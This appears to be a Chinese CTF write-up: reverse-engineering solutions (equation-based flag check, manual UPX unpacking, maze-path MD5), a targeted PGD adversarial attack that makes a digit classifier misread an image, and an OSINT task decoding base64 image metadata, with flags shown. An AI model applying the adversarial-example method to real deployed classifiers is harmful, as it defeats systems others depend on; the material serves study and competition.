先看 main。开头检查 `strlen(input) == 0x16`，也就是 22 字节，不对就打印 Wrong length。然后进入循环，每次取两个字节：

```
movsx eax, BYTE PTR [rsi+rdx*2]      ; a
movsx ecx, BYTE PTR [rsi+rdx*2+1]    ; b
lea   edi, [rax+rcx]
cmp   edi, DWORD PTR [r8+rdx*4]      ; a+b == sums[i]
sub   eax, ecx
cmp   eax, DWORD PTR [r9+rdx*4]      ; a-b == diffs[i]
```

`r8` 指向栈上的 sum 数组，`r9` 指向 `rsp+0x30` 的 diff 数组，各 11 个 dword，循环 11 次。把 main 开头 `mov DWORD PTR [rsp+...]` 的立即数抄出来：

```
sums  = [222,215,218,242,209,210,210,203,230,215,227]
diffs = [-6,17,14,4,-7,-12,8,-13,-2,-17,-23]
```

每一对字符解二元一次方程：

```
a = (sum + diff) / 2
b = (sum - diff) / 2
```

第一个：`a=(222-6)/2=108`，是 `l`；`b=(222+6)/2=114`，是 `r`。11 组都算一遍：

| i | sum | diff | a | b | 字符 |
| --- | --- | --- | --- | --- | --- |
| 0 | 222 | -6 | 108 | 114 | lr |
| 1 | 215 | 17 | 116 | 99 | tc |
| 2 | 218 | 14 | 116 | 102 | tf |
| 3 | 242 | 4 | 123 | 119 | {w |
| 4 | 209 | -7 | 101 | 108 | el |
| 5 | 210 | -12 | 99 | 111 | co |
| 6 | 210 | 8 | 109 | 101 | me |
| 7 | 203 | -13 | 95 | 108 | _l |
| 8 | 230 | -2 | 114 | 116 | rt |
| 9 | 215 | -17 | 99 | 116 | ct |
| 10 | 227 | -23 | 102 | 125 | f} |

拼起来 `lrtctf{welcome_lrtctf}`，长度 22，和 strlen 的检查对上。喂回程序：

```
$ echo 'lrtctf{welcome_lrtctf}' | ./ez2
Equations solved! Submit your flag!
```

```
lrtctf{welcome_lrtctf}
```
### Mazerev

`challenge1.exe`，x64 PE，81KB，节表三个节：

```
节名          VAddr      VSize     RawPtr    RawSize   特征
UPX0          1000      1d000       200          0     XRW
UPX1         1e000       9000       200       8c00     XRW
UPX2         27000       1000      8e00        200      RW
```

UPX 壳。

![PE 节表，三个 UPX 节](/images/20261108181014_24.png)

机器上没有 upx，按格式手动解。`UPX!` 在 `0x205`，前面带版本字符串：

```
@0x200: 35 2e 31 30 00 55 50 58 21 0d 24 02 08 ...
        version=0xd  format=0x24  method=0x2  level=0x8

u_len       = 149297
c_len       = 34679
u_file_size = 148402
```

入口点 RVA `0x267a0`，文件偏移 `0x89a0`：

```asm
0x89a4: lea rsi, [rip - 0x8786]     ; 压缩数据起点
0x89bb: call 0x8a10                 ; 解压主循环
0x8a1d: mov dl, [rsi]
0x8a1f: add ebx, ebx                ; 取 bit
0x8a2d: jb 0x8a15                   ; bit=1 -> literal
```

NRV2B。用 unicorn 按节表把三段加载到 `0x140000000`，从入口跑到 `0x8a96`，dump 出 `UPX0`：

```python
mu.mem_map(IB, 0x40000)
for va, vs, rp, rs in secs:
    mu.mem_write(IB + va, d[rp:rp+rs])
mu.emu_start(IB + 0x267A0, IB + 0x8a96, ...)
```

解出 147464 字节，字符串里能看到：

```
Welcome to this CTF opening contest
Please input your flag:
lrtctf{
```

![UPX 头和解压循环](/images/20261108181014_25.png)

main 在 `0x140013b2c`，读入后调 `0x140002b20`。这个函数只做三个检查：`strncmp(input, "lrtctf{", 7)`、`strlen(input) == 0x28`、`input[0x27] == '}'`。长度固定 40。

比对在 `0x1400029d0`。三次 `call 0x140002670`（参数 0、1、2）各生成一段字符串，`strcpy`/`strcat` 拼起来，送进 `0x1400023c0` 算摘要，`0x1400025f0` 转 hex，最后和 `input+7` 比 32 字节。

`0x1400023c0` 是标准 MD5 update：64 字节块、bit 计数右移 3、掩码 `0x3f`。

`0x140002670` 里有一句 `mov dword ptr [rsp+0x3c], 0x77617364`，即 `"wasd"`。参数 `ecx` 乘 225 定位到一张表，表里值为 3 和 4 的格子分别是起点和终点，然后做搜索、按方向记录字符。

表在 RVA `0x14020`，225 × 3 个 int，是 3 个 15×15 网格，0 通路、1 墙、3 起点、4 终点：

![三个 15×15 迷宫](/images/20261108181014_26.png)

方向从分支里读：

- `w` → `lea r11d, [rax-1]`，行 -1
- `s` → `lea r11d, [rax+1]`，行 +1
- `a` → `sub r15d, 1`，列 -1
- `d` → `lea r15d, [rsi+1]`，列 +1

搜索是从终点走向起点的，记录的字符序列在 `0x2973` 处反转后输出。

直接把 `0x2670` 跑出来最快。`0x13a10` 这一类都是 `jmp [rip+0x69da]`，跳转表在 `0x1a3f0`，把表里每项改指到自己的桩，桩里实现 memset，然后 `call 0x140002670`。

三段输出：

```
idx=0: dddsssddssaaawaasssddddds
idx=1: dddddssaassaawwaassssddddds
idx=2: ddssddwwddssssa
```

拼起来 67 字节：

```
dddsssddssaaawaasssdddddsdddddssaassaawwaassssdddddsddssddwwddssssa
```

MD5：

```
d75871d810d84814126b8427d579c25a
```

回程序验证：

```bash
echo "lrtctf{d75871d810d84814126b8427d579c25a}" | ./challenge1.exe
```

```
Welcome to this CTF opening contest
Please input your flag:right
```

![运行验证，正确时打印 right](/images/20261108181014_27.png)

```
lrtctf{d75871d810d84814126b8427d579c25a}
```

## AI

### Lap酱的门禁

题面规则：

- 模型预测必须是 √49，也就是 7
- 提交图和 `sample.png`（数字 3）的 L∞ 扰动不能超过 0.35

点页面上的"下载样例图"拿到 `/sample`，确认是 28×28 灰度。附件里的 `model.pt`、`model.py` 和服务端是同一份，直接本地加载：

```python
model = load_model('model.pt')
x = torch.tensor(np.array(Image.open('sample.png')).astype(np.float32)/255.0)[None,None]
out = model(x)[0]
```

样例图本身预测为 3，logits 是：

```
[-12.972, -9.077, -2.314, 16.543, -24.549, -5.650, -15.442, -11.286, -3.472, -0.923]
```

起点离目标 7 很远，不能改输出，只能改输入。约束是 L∞ ≤ 0.35（像素按 0~1 算，相当于 ±89 个灰度级），预算够，用定向 PGD。

目标不是"让 7 变成最大就停"，而是把 `logit7 - max(其他 logit)` 拉大，所以 loss 取负的 margin：

```
loss = -(out[7] - max(out[0..6], out[8..9]))
```

每一步做三件事：

1. 对 `delta` 求梯度，Adam 更新
2. `delta = clamp(delta, -0.35, 0.35)`
3. `x_adv = clamp(x0 + delta, 0, 1)`

同时记录 class 7 logit 最大的一步，不直接用最后一步，避免过冲。跑 400 步后本地模型预测已经是 7，class 7 稳定排第一，其他类都是负数。

保存成 PNG 会从浮点量化到 8 位，重新算最大像素差：

```
max(|q/255 - x0|) = 0.34902
```

还在 0.35 以内。

先在线上 `/api/predict` 验证，POST 的 JSON 只有 `{"image": "<base64>"}`，返回：

```json
{"prediction":7,"top5":{"1":0.0,"2":0.0,"3":0.0,"7":1.0,"8":0.0}}
```

确认无误再打 `/api/submit`，同样只传图片：

```json
{"flag":"lrtctf{62bb80bb-ece4-47c5-b40f-aed493d3469b}","perturbation":0.349,"prediction":7,"success":true}
```

## OSINT

### LAP酱的旅行日记Ⅱ

下载图片后，右击查看图片属性，在详细信息里面发现了很多的 base64 编码，结合题目给的 flag 例子：`lrtctf{重庆_四川成都_2026/11/8_1111}`，把这些 base64 解码再组合一下：
![](/images/20261108181014_28.png)

```
5ZWm5ZWm5ZWm ZnJvbWxpYW9uaW5naHVsdWRhbw==
2026/8/23 10:42
ZmFrZSBzaG9vdGluZyB0aW1l
Y29ycmVjdGRhdGU=
TEVJQ0E=
dG90aWFuamluZw==
dGltZV8wOTEx
```

逐个解码：

| 原文 | 解码 |
| --- | --- |
| `5ZWm5ZWm5ZWm` | 啦啦啦 |
| `ZnJvbWxpYW9uaW5naHVsdWRhbw==` | fromliaoninghuludao |
| `2026/8/23 10:42` | 明文时间（拍摄时间） |
| `ZmFrZSBzaG9vdGluZyB0aW1l` | fake shooting time |
| `Y29ycmVjdGRhdGU=` | correctdate |
| `TEVJQ0E=` | LEICA |
| `dG90aWFuamluZw==` | totianjing |
| `dGltZV8wOTEx` | time_0911 |

得到：

```
lrtctf{辽宁葫芦岛_天津_2026/8/23_0911}
```
